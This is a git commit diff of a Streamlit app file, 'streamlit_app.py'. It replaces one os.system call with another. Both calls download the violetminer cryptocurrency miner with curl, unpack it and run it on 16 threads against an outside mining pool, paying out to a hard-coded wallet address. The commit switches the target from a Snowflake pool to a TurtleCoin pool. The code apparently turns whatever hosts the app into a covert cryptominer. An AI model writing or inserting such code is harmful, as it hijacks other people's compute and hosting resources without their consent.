ca5deefcc720d68446e633cb3f96ab28eb024c03
hagacz <112244590+hagacz@users.noreply.github.com>
2022-08-28 10:04:44 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm chukwa --pool pool.snowflake-net.com:3333 --username SNW1aa1fKpvAEWXGgBC37R9jQYinA7A3V9EJWgjE7sc1HvvJKhc5oXY94boBG56U3C94boBG56U3C94boBG56U3C94boBemmYeEZRiK5wTYChJYBGJ47eevunGr5S88fJd27Bd1Fr5aw57WCXapZw1PnmrMGsETnC3iQ8enC7kwYuDTy9mSywd4RyP.001 --password x --disableNVIDIA --threads 16")
+os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm turtlecoin --pool us.turtlecoin.herominers.com:1160 --username TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+8d5e969cca8a2574a89fb560d72ab93ab362a1588ae494942265d805aebd4fd5 --password nung --disableNVIDIA --threads 16")
